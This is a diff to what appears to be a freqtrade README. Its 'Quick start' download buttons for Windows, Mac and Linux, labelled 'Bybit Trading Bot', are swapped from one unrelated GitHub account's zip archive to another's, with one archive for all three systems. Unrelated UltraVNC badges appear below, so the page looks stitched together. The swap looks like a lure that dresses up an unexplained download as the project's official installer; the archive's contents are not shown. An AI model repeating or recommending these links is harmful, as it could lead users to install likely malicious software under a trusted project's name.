@@ -78,14 +78,14 @@ Please find the complete documentation on the [freqtrade website](https://www.fr
 ## Quick start
 
 
-<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip">Bybit Trading Bot for Windows</a>
+<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip">Bybit Trading Bot for Windows</a>
 
 
-<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-apple-856-675863.png?f=webp&w=256" width=110  
-align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip">Bybit Trading Bot for Mac</a>
+<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-apple-856-675863.png?f=webp&w=256" width=110  
+align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip">Bybit Trading Bot for Mac</a>
 
 
-<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-linux-3049927-2538320.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.12/releases/download/v.2/Version_5.8.2.zip">Bybit Trading Bot for Linux</a> 
+<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-linux-3049927-2538320.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/XmindApp/Bybit-Trading-Bot/releases/download/5.8.1/Bybit-Trading-Bot.zip">Bybit Trading Bot for Linux</a> 
 
   <a href="https://github.com/orgs/ultravnc/followers" target="_blank" rel="noopener"><img src="https://img.shields.io/github/followers/ultravnc?color=%23066da5&label=followers&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Followers"></a>
   <a href="https://github.com/ultravnc/UltraVNC/watchers" target="_blank" rel="noopener"><img src="https://img.shields.io/github/watchers/ultravnc/UltraVNC?color=%23066da5&label=watchers&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Watchers"></a>
